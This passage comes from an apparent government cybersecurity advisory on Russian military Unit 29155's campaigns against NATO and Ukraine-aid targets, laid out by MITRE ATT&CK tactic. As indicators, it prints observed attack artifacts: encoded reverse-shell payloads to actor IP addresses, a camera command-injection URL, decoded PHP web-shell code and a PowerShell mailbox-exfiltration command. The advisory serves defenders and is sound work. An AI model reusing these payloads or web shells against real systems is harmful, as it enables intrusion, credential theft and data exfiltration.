<p>In addition to WhisperGate and other incidents against Ukraine, Unit 29155 cyber actors have conducted computer network operations against numerous members of the North Atlantic Treaty Organization (NATO) in Europe and North America, as well as countries in Europe, Latin America, and Central Asia. The activity includes cyber campaigns such as website defacements, infrastructure scanning, data exfiltration, and data leak operations. These actors sell or publicly release exfiltrated victim data obtained from their compromises. Since early 2022, the primary focus of the cyber actors appears to be targeting and disrupting efforts to provide aid to Ukraine.</p>
<p>To date, the FBI has observed more than 14,000 instances of domain scanning across at least 26 NATO members and several additional European Union (EU) countries. Unit 29155 cyber actors have defaced victim websites and used public website domains to post exfiltrated victim information.</p>
<p>Whether through offensive operations or scanning activity, Unit 29155 cyber actors are known to target critical infrastructure and key resource sectors, including the government services, financial services, transportation systems, energy, and healthcare sectors of NATO members, the EU, Central American, and Asian countries.</p>
<h3>TTP Overview</h3>
<h4><strong>Reconnaissance</strong></h4>
<p>Unit 29155 cyber actors have been observed targeting IP ranges [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a>] used within multiple government and critical infrastructure organizations. The following are publicly available tools these cyber actors have used for scanning [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a>] and vulnerability exploit efforts. Unit 29155 cyber actors were not observed using these tools outside of their intended purpose. <strong>Note:&nbsp;</strong>Use of these tools should not be attributed as malicious without analytical evidence to support threat actor use and/or control.</p>
<ul>
<li><strong>Acunetix:</strong> Unit 29155 cyber actors leveraged both Acunetix and Nmap to identify open ports, services, and vulnerabilities for networks [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a>].[<a href=\"https://www.acunetix.com/support/docs/introduction/\" title=\"Introduction to Acunetix\">6</a>]</li>
<li><strong>Amass:</strong> Unit 29155 cyber actors leveraged both Amass and VirusTotal to obtain subdomains for target websites [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a>].[<a href=\"https://github.com/owasp-amass/amass\" title=\"owasp-amass / amass\">7</a>]</li>
<li><strong>Droopescan</strong>[<a href=\"https://kalilinuxtutorials.com/droopescan/\" title=\"Droopescan : A Plugin-Based Scanner That Aids Security Researchers\">8</a>]</li>
<li><strong>JoomScan</strong>[<a href=\"https://github.com/OWASP/joomscan\" title=\"OWASP / joomscan\">9</a>]</li>
<li><strong>MASSCAN:</strong> Unit 29155 cyber actors used MASSCAN and Nmap to discover other machines once inside victim networks.[<a href=\"https://www.kali.org/tools/masscan/\" title=\"Masscan\">10</a>]</li>
<li><strong>Netcat</strong>[<a href=\"https://www.digitalocean.com/community/tutorials/how-to-use-netcat-to-establish-and-test-tcp-and-udp-connections\" title=\"How To Use Netcat to Establish and Test TCP and UDP Connections\">11</a>]</li>
<li><strong>Nmap:</strong> Once Unit 29155 cyber actors gained access to victim internal networks, they further used Nmap (via the Nmap Scripting Engine [NSE]) to write custom scripts for discovering and scanning other machines [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1046/\" title=\"Network Service Discovery\">T1046</a>].</li>
<li><strong>Shodan:</strong> Unit 29155 cyber actors used Shodan to identify hosts with a specific set of vulnerabilities or device types [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/005/\" title=\"Search Open Technical Databases: Scan Databases\">T1596.005</a>].[<a href=\"https://help.shodan.io/the-basics/what-is-shodan\" title=\"What is Shodan?\">12</a>]</li>
<li><strong>VirusTotal</strong>[<a href=\"https://docs.virustotal.com/docs/how-it-works\" title=\"How it works\">13</a>]</li>
<li><strong>WPScan</strong></li>
</ul>
<p>Additionally, Unit 29155 cyber actors have used infrastructure configured with OpenVPN configuration [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1572/\" title=\"Protocol Tunneling\">T1572</a>] over port 1194, and in some instances, to perform Active Directory (AD) enumeration<a>. </a>Adminer in combination with <a href=\"https://attack.mitre.org/versions/v15/software/S0357/\" title=\"Impacket\">Impacket</a> and ldapdomaindump were tools used for gathering information on AD. Once active devices are found, Unit 29155 cyber actors look for vulnerabilities to exploit. For example, the Acunetix vulnerability scanning tool has been used for gathering information on potential vulnerabilities such as blind cross-site scripting, as shown in the following commands:</p>
<p><code>GET /index.php?log=to@example.com&gt;%0d%0abcc:009247.3183-377.3183.1bf6c.19446.2@bxss.me</code></p>
<p><code>\"GET /CMS/files/log.htm HTTP/1.1\" * * \"(nslookup hitccruvbrumn76c1b.bxss.me||perl -e \\\"gethostbyname('hitccruvbrumn76c1b.bxss.me')\\\")\"</code></p>
<p>As the cyber actors perform reconnaissance on victim networks and discover vulnerabilities within victim web servers or machines, they obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\">T1588.005</a>]. Unit 29155 cyber actors have been observed obtaining the respective exploit scripts for, but not exploiting,<strong> </strong>the following CVEs:</p>
<ul>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-1472\" title=\"CVE-2020-1472 Detail\">CVE-2020-1472</a> (Microsoft: Windows Server)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-26084\" title=\"CVE-2021-26084 Detail\">CVE-2021-26084</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3156\" title=\"CVE-2021-3156 Detail\">CVE-2021-3156</a> (Red Hat: Privilege Escalation via Command Line Argument Parsing)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-4034\" title=\"CVE-2021-4034 Detail\">CVE-2021-4034</a> (Red Hat: Polkit Privilege Escalation)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-27666\" title=\"CVE-2022-27666 Detail\">CVE-2022-27666</a> (Red Hat: Heap Buffer Overflow Flaw)</li>
</ul>
<p>Analysis concluded Unit 29155 cyber actors have exploited the following CVEs for initial access [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\">T1190</a>], as detailed throughout this advisory:</p>
<ul>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33044\" title=\"CVE-2021-33044 Detail\">CVE-2021-33044</a> (Dahua Security)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-33045\" title=\"CVE-2021-33045 Detail\">CVE-2021-33045</a> (Dahua Security)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26134\" title=\"CVE-2022-26134 Detail\">CVE-2022-26134</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-26138\" title=\"CVE-2022-26138 Detail\">CVE-2022-26138</a> (Atlassian Confluence Server and Data Center)</li>
<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-3236\" title=\"CVE-2022-3236 Detail\">CVE-2022-3236</a> (Sophos: Firewall)</li>
</ul>
<h4><strong>Resource Development</strong></h4>
<p>Rather than build custom solutions, Unit 29155 cyber actors use common red teaming techniques and publicly available tools to conduct cyber operations. As a result, many TTPs overlap with those of other cyber actors, which can lead to misattribution.</p>
<p>Unit 29155 actors and their cyber-criminal affiliates commonly maintain accounts on dark web forums; this has provided the opportunity to obtain various hacker tools such as malware and malware loaders [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a>] like Raspberry Robin and SaintBot. While Unit 29155 cyber actors are best known for their use of WhisperGate malware against Ukraine, the use of WhisperGate is not unique to the group. Technical analysis can be found in <strong>Appendix A: WhisperGate Malware Analysis</strong>.</p>
<h4><strong>Initial Access</strong></h4>
<p>Unit 29155 cyber actors are known to use VPNs to anonymize their operational activity. These cyber actors commonly attempt to exploit weaknesses in internet-facing systems, like the CVEs listed above, to initially access networks. In one instance, Unit 29155 cyber actors exploited CVE-2021-33044 and CVE-2021-33045 on Dahua IP cameras to bypass identity authentication.</p>
<h4><strong>Lateral Movement</strong></h4>
<p>Unit 29155 cyber actors have used Shodan to scan for Internet of Things (IoT) devices, using exploitation scripts to authenticate to IP cameras with default usernames and passwords [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a>], and exfiltrating images [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1125/\" title=\"Video Capture\">T1125</a>] (JPG files). Attempts are then made to perform remote command execution via web to vulnerable IP cameras; if successful, cyber actors would dump configuration settings and credentials in plaintext (as shown in <strong>Table 1</strong> below) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1552/001/\" title=\"Unsecured Credentials: Credentials In Files\">T1552.001</a>].</p>
<p><strong>Appendix B: Indicators of Compromise</strong> lists threat actor IP addresses associated with the activity detailed in this section.</p>
<p><strong>Note:</strong> These events are independent and not correlated as a single timeline of compromise.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Event</th>
<th role=\"columnheader\">Victim Observation</th>
</tr>
</thead>
<tbody>
<tr>
<td>Web requests observed from victim infrastructure</td>
<td>
<p>These requests are likely intended to dump configuration settings and credentials&nbsp;[<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/\" title=\"OS Credential Dumping\">T1003</a>]:</p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/PictureCatch.cgi?username=&lt;NAME&gt;&amp;password=%3becho%20%22%3c%21--%23include%20file=%22SYS_CFG%22--%3e%22%3etmp/Login.htm%3b&amp;data_type=1&amp;attachment=1&amp;channel=1&amp;secret=1&amp;key=PWNED</code></p>
<p><code>hxxp://&lt;IP&gt;:&lt;port&gt;/ssi.cgi/tmp/Login.htm</code></p>
</td>
</tr>
<tr>
<td>POST requests sent to victims with payloads [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/001/\" title=\"Application Layer Protocol: Web Protocols\">T1071.001</a>]</td>
<td>
<p><code>\"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F179.43.175.38%2F6870%200%3E%261%22))%7d\"</code></p>
<p><code>\"txtUser=lol&amp;txtPassword=2&amp;btConnect=Piesl%C4%93gtiesbtConnect=Piesl%C4%93gties&amp;chRemember=on&amp;txtPassword=g00dPa%24%24w0rD&amp;txtUser=$%7b@print(system(%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F81.17.24.130%2F6870%200%3E%261%22))%7d\"</code></p>
</td>
</tr>
<tr>
<td>URL encoded values from txtUser for both commands decoded to embedded bash commands</td>
<td>
<p><code>${@print(system(\"bash -i &gt;&amp; /dev/tcp/179.43.175.38/6870 0&gt;&amp;1\"))}</code></p>
<p><code>${@print(system(\"bash -i &gt;&amp; /dev/tcp/81.17.24.130/6870 0&gt;&amp;1\"))}</code></p>
</td>
</tr>
</tbody>
</table>
<p>In addition, incident analysis identified the general observations listed below on victim infrastructure. Each event should be considered independent and may have been used by Unit 29155 cyber actors against multiple victims at different dates and timeframes. <strong>Appendix B: Indicators of Compromise</strong> lists IOCs associated with the observations in <strong>Table 1</strong> and below.</p>
<ul>
<li>In one instance shortly following a deployment of WhisperGate malware, Unit 29155 cyber actors exfiltrated data to&nbsp;<code>mega[.]nz</code> using&nbsp;<a href=\"https://attack.mitre.org/versions/v15/software/S1040/\" title=\"Rclone\">Rclone</a> [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1567/002/\" title=\"Exfiltration Over Web Service: Exfiltration to Cloud Storage\">T1567.002</a>].</li>
<li>Unit 29155 cyber actors used a Pass-the-Hash [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1550/002/\" title=\"Use Alternate Authentication Material: Pass the Hash\">T1550.002</a>] via ProxyChains.</li>
<li>Cyber actors performed SSH and SSHPass executions.</li>
<li>Cyber actors initiated a web request and executed commands via ProxyChains. This included obtaining NT hashes via Server Message Block (SMB) using smbclient, executing Windows Management Instrumentation (WMI) with hashes, and making web requests with resources <code>i.php</code> and <code>tunnel.jsp</code>. In one instance, cyber actors used smbclient via ProxyChains to access internal network shares, and subsequently PSQL and MySQL clients to access internal databases.</li>
<li>Cyber actors used Impacket for post-exploitation and lateral movement. The script <code>secretsdump.py</code> was used from the Impacket framework to obtain domain credentials, while <code>psexec.py</code> was subsequently used to move laterally within a victim network.&nbsp;</li>
<li>Cyber actors used <code>ntlmrelayx.py</code> via Impacket and <code>krbrelayx.py</code>, which requires Impacket to function.</li>
<li>Cyber actors used <code>Responder.py</code>.</li>
<li>Cyber actors used <code>su-bruteforce</code> to brute force a selected user using the <code>su</code> command.</li>
<li>Cyber actors used <a href=\"https://attack.mitre.org/software/S0521/\" title=\"BloodHound\">BloodHound</a>, an open source AD reconnaissance tool that can reveal hidden relationships and identify attack paths within an AD environment.</li>
<li>Cyber actors used CrackMapExec via ProxyChains with SMB protocol targeting internal victim IP addresses. This open source post-exploitation tool automates assessing the security of large AD networks.</li>
<li>Cyber actors used <code>LinPEAS</code>, an open source script designed to automate the process of searching for potential privilege escalation vulnerabilities on a Linux victim.</li>
<li>Cyber actors used GO Simple Tunnel (GOST) (MD5: <code>896e0f54fc67d72d94b40d7885f10c51</code>) for 30 days within one incident and against additional victims on various occasions. GOST is a tunneling tool designed to establish secure connections between clients and servers, allowing for secure data transmission over untrusted networks.</li>
<li>Cyber actors used Through the Wire against a victim’s internet-facing Confluence server. Through the Wire is a proof of concept[<a href=\"https://github.com/jbaines-r7/through_the_wire\" title=\"jbaines-r7 / through_the_wire\">14</a>] exploit for CVE-2022-26134, an OGNL injection vulnerability allowing an unauthenticated user to execute arbitrary code on a Confluence Server or Data Center instance. All versions of Confluence Server and Data Center prior to the fixed versions listed by Atlassian are affected by this vulnerability.[<a href=\"https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html\" title=\"Confluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability\">15</a>] A reverse shell over HTTPS was used to communicate over listening host on port <code>8081</code>.</li>
<li>Cyber actors initiated Nmap scans on localized web servers.</li>
<li>Cyber actors performed lateral movement from compromised web servers to exploit a corporate Microsoft Windows network, commonly using <code>psexec.py</code> from the Impacket framework. The script <code>secretsdump.py</code> from the Impacket framework was used to obtain domain credentials.</li>
<li>Cyber actors may have used Raspberry Robin malware in the role of an access broker [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a>].</li>
<li>Cyber actors targeted victims’ Microsoft Outlook Web Access (OWA) infrastructure with password spraying to obtain valid usernames and passwords [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1110/003/\" title=\"Brute Force: Password Spraying\">T1110.003</a>].</li>
</ul>
<h3>Command and Control</h3>
<h4><strong>Infrastructure</strong></h4>
<p>Since at least 2020, Unit 29155 cyber actors have used virtual private servers (VPSs) [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1583/003/\" title=\"Acquire Infrastructure: Virtual Private Server\">T1583.003</a>] to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data. Use of VPSs are common due to the associated IP addresses not identifying their true country of origin.</p>
<h4><strong>Post-Exploitation</strong></h4>
<div class=\"WordSection1\">
<p>When an exploit is successfully executed on a victim system, the actors can then launch a Meterpreter payload [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1105/\" title=\"Ingress Tool Transfer\">T1105</a>], which commonly uses a reverse Transmission Control Protocol (TCP) connection to initiate communication with the threat actors’ infrastructure [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1095/\" title=\"Non-Application Layer Protocol\">T1095</a>]. In one instance, an established reverse TCP session was observed from victim to actor infrastructure via the following ports:</p>
<ul>
<li>1234</li>
<li>1851</li>
<li>43221</li>
<li>443</li>
<li>4444</li>
<li>4688</li>
<li>5432</li>
<li>8080</li>
<li>8081</li>
<li>8082</li>
<li>8084</li>
<li>8085</li>
<li>8088</li>
<li>8089</li>
<li>8090</li>
<li>8443</li>
<li>8487</li>
<li>8888</li>
</ul>
<p>Additional observations were collected from victim engagement and analysis, including:</p>
<ul>
<li>Use of the Metasploit Framework to search for and/or access modules such as <code>mysql</code>, <code>postgres</code>, and <code>ssh</code> software and features.</li>
<li>Use of Meterpreter and Netcat to execute reverse shells over ports such as 8081.</li>
<li>Use of Impacket.</li>
<li>Use of PHP (<code>exp_door v1.0.2</code>, <code>b374k</code>, <code>WSO 4.0.5</code>) and the <a href=\"https://attack.mitre.org/versions/v15/software/S0598/\" title=\"P.A.S. Webshell\">P.A.S.</a> web shells [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a>], likely for initial access.</li>
<li>Use of EternalBlue.[<a href=\"https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010\" title=\"Microsoft Security Bulletin MS17-010 - Critical\">16</a>],[<a href=\"https://www.avast.com/c-eternalblue\" title=\"What Is EternalBlue and Why Is the MS17-010 Exploit Still Relevant?\">17</a>]</li>
<li>Use of reGeorg or Neo-reGeorg to set up a proxy to tunnel network traffic following compromise of a victim website, as well as use of ProxyChains to run Nmap within the network.</li>
</ul>
<h4><strong>Encrypted Communication</strong></h4>
<p>Once Unit 29155 cyber actors gain access to the victims’ internal network, the victims have observed:</p>
<ol>
<li>Using Domain Name System (DNS) tunneling tools, such as dnscat/2 and Iodine, to tunnel IPv4 network traffic [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1071/004/\" title=\"Application Layer Protocol: DNS\">T1071.004</a>]. For example, Iodine was used to tunnel data via <code>dns.test658324901domain.me</code>.</li>
<li>Configuring a proxy within the victim infrastructure and executing commands within the network via ProxyChains. ProxyChains—a tool used to route internal traffic through a series of proxies [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1090/003/\" title=\"Proxy: Multi-hop Proxy\">T1090.003</a>]—has been used to provide further anonymity and modify system configuration to force network traffic through chains of SOCKS5 proxies and respective ports. The following ports used by actor infrastructure include:
<ol>
<li>1080</li>
<li>1333</li>
<li>13381</li>
<li>13391</li>
<li>13666</li>
<li>13871</li>
<li>1448</li>
<li>1888</li>
<li>3130</li>
<li>3140</li>
<li>4337</li>
<li>50001</li>
<li>8079</li>
</ol>
</li>
<li>Using the GOST open source tunneling tool (via SOCKS5 proxy) named <code>java</code>, as detailed in the following running processes in victim incident response results:</li>
</ol>
<p><code>8212 - SJ 0:02.54 HISTFILE=/dev/null</code><br><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br><code>PWD=/tmp/.ICE-unix HOME=/ RC PID=33980 ./java –L</code><br><code>socks5://127.0.0.1:13338</code></p>
<p><code>8282 - IJ 0:03.98 HISTFILE=/dev/null</code><br><code>PATH=/sbin:/bin:/usr/sbin:/usr/bin</code><br><code>LD_LIBRARY_PATH=/usr/local/lib:/usr/local/lib OLDPWD=/tmp</code><br><code>PWD=/tmp/.ICE-unix HOME=/ RC_PID=33980 ./java –L</code><br><code>rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://{IP Address}:7896</code></p>
<ol>
<li>Modifying .php scripts to manipulate server-side operations, such as the observations listed in <strong>Table 2</strong> below.</li>
</ol>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Script (Base64 Decoded)</th>
<th role=\"columnheader\">Command</th>
<th role=\"columnheader\">Purpose&nbsp;</th>
</tr>
</thead>
<tbody>
<tr>
<td>usr/local/www/apache24/data/-redacted-/plugins/extension/oomla/oomla.php</td>
<td>
<p><code>if (isset($ POST [\"sessionsid_wp\"] ))</code></p>
<p><code>{</code></p>
<p><code>$poll id = $ POST [\"sessionsid_wp\") ;</code></p>
<p><code>$sessii = explode(\":\",</code></p>
<p><code>base64_decode($poll_id)) ;$sock=fsockopen($sessii[O) ,$sessii[l));</code></p>
<p><code>$proc=proc_open(/bin/sh -i), array(O=&gt;$sock, l=&gt;$sock,</code></p>
<p><code>2=&gt;$sock) ,$pipes);</code></p>
<p><code>}</code></p>
</td>
<td>Creates session.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/authentication/joomla/oomla.php</td>
<td>
<p><code>function nb_res($a)</code></p>
<p><code>{</code></p>
<p><code>eval(system('base64 decode ($a) ');</code></p>
<p><code>}</code></p>
</td>
<td>Allows program to run.</td>
</tr>
<tr>
<td>Usr/local/www/apache24/data/-redacted-/plugins/privacy/contact/contact.php</td>
<td>
<p><code>if (isset($_POST['fl']))</code></p>
<p><code>{</code></p>
<p><code>$fl=$_POST['fl'] ;</code></p>
<p><code>$f2=$_POST['f2'] ;</code></p>
<p><code>$content = base64 decode($fl);</code></p>
<p><code>$h = fopen($f2.\"w\");</code></p>
<p><code>$text = \"$content\";</code></p>
<p><code>fwrite($h.$text) ;</code></p>
<p><code>fclose ($h) ;</code></p>
<p><code>}</code></p>
</td>
<td>Allows writing to files.</td>
</tr>
</tbody>
</table>
<p>Exfiltration</p>
<p>In several instances, analysis identified Unit 29155 cyber actors compressing victim data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1560/\" title=\"Archive Collected Data\">T1560</a>] (e.g., the entire filesystem, select file system artifacts or user data, and/or database dumps) to send back to their infrastructure. These cyber actors commonly use the command-line program Rclone to exfiltrate data to a remote location from victim infrastructure.</p>
<p>Unit 29155 cyber actors have exfiltrated Windows processes and artifacts, such as Local Security Authority Subsystem Service (LSASS) memory dumps [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/001/\">T1003.001</a>], Security Accounts Manager (SAM) files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/002/\" title=\"OS Credential Dumping: Security Account Manager\">T1003.002</a>], and SECURITY and SYSTEM event log files [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1654/\" title=\"Log Enumeration\">T1654</a>]. As seen in victim incident response results, actor infrastructure has also been used to compromise multiple mail servers [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1114/\" title=\"Email Collection\">T1114</a>] and exfiltrate mail artifacts, such as email messages, using PowerShell [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a>] via the following command:</p>
<p><code>powershell New-MailboxExportRequest – Mailbox &lt;resource&gt; – FilePath `\\\\{IP Address}\\sharefolder\\1.pst`</code></p>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See <strong>Table 3 to&nbsp;Table 14</strong> for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href=\"https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping\" title=\"Best Practices for MITRE ATT&amp;CK Mapping\">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href=\"https://github.com/cisagov/Decider/\" title=\"cisagov / decider\">Decider Tool</a>.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 3: Reconnaissance</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gather Victim Network Information: DNS</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1590/002/\" title=\"Gather Victim Network Information: DNS\">T1590.002</a></td>
<td>Unit 29155 cyber actors have used Amass and VirusTotal to obtain information about victims’ DNS for possible use during targeting, such as subdomains for target websites.</td>
</tr>
<tr>
<td>Active Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/\" title=\"Active Scanning\">T1595</a></td>
<td>Unit 29155 cyber actors use publicly available tools to gather information for possible use during targeting.</td>
</tr>
<tr>
<td>Active Scanning: Scanning IP Blocks</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/001/\" title=\"Active Scanning: Scanning IP Blocks\">T1595.001</a></td>
<td>Unit 29155 cyber actors use various open source scanning tools to scan for victim IP ranges.</td>
</tr>
<tr>
<td>Active Scanning: Vulnerability Scanning</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1595/002/\" title=\"Active Scanning: Vulnerability Scanning\">T1595.002</a></td>
<td>Unit 29155 cyber actors use publicly available scanning tools to enable their discovery of IoT devices and exploitable vulnerabilities. Tools leveraged for scanning include Acunetix, Amass, Droopescan, eScan, and JoomScan.</td>
</tr>
<tr>
<td>Search Open Technical Databases: Scan Databases</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1596/005/\" title=\"Search Open Technical Databases: Scan Databases\">T1596.005</a></td>
<td>Unit 29155 cyber actors use publicly available platforms like Shodan to identify internet connected hosts.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 4: Resource Development</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Acquire Infrastructure: Virtual Private Server</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1583/003/\" title=\"Acquire Infrastructure: Virtual Private Server\">T1583.003</a></td>
<td>Unit 29155 cyber actors have used VPSs to host their operational tools, perform reconnaissance, exploit victim infrastructure, and exfiltrate victim data.</td>
</tr>
<tr>
<td>Obtain Capabilities: Malware</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/001/\" title=\"Obtain Capabilities: Malware\">T1588.001</a></td>
<td>Unit 29155 cyber actors obtain publicly available malware and malware loaders to support their operations. For example, analysis suggests Raspberry Robin malware may have been used in the role of an access broker.</td>
</tr>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1588/005/\" title=\"Obtain Capabilities: Exploits\">T1588.005</a></td>
<td>Unit 29155 cyber actors are known to obtain CVE exploit scripts from GitHub repositories and use them against victim infrastructure.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 5: Initial Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th colspan=\"2\" role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Valid Accounts: Default Accounts</td>
<td colspan=\"2\"><a href=\"https://attack.mitre.org/versions/v15/techniques/T1078/001/\" title=\"Valid Accounts: Default Accounts\">T1078.001</a></td>
<td>Unit 29155 cyber actors use exploitation scripts to authenticate to IP cameras with default usernames and passwords.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a></td>
<td colspan=\"2\">
<p>Unit 29155 cyber actors have used a variety of public exploits, including CVE-2021-33044, CVE-2021-33045, CVE-2022-26134, and CVE-2022-26138.</p>
<p>The proof of concept exploit for CVE-2022-26134, Through the Wire, has also been used against a victim’s internet-facing Confluence server.</p>
</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 6: Execution</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter: PowerShell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1059/001/\" title=\"Command and Scripting Interpreter: PowerShell\">T1059.001</a></td>
<td>Unit 29155 cyber actors have used PowerShell to execute commands and other operational tasks.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 7: Persistence</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Server Software Component: Web Shell</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1505/003/\" title=\"Server Software Component: Web Shell\">T1505.003</a></td>
<td>Unit 29155 cyber actors use web shells to establish persistent access to systems.</td>
</tr>
</tbody>
</table>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 8: Credential Access</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Technique Title</th>
<th role=\"columnheader\">ID</th>
<th role=\"columnheader\">Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping: LSASS Memory</td>
<td><a href=\"https://attack.mitre.org/versions/v15/techniques/T1003/001/\" title=\"OS Credential Dumping: LSASS Memory\">T1003.001</a></td>
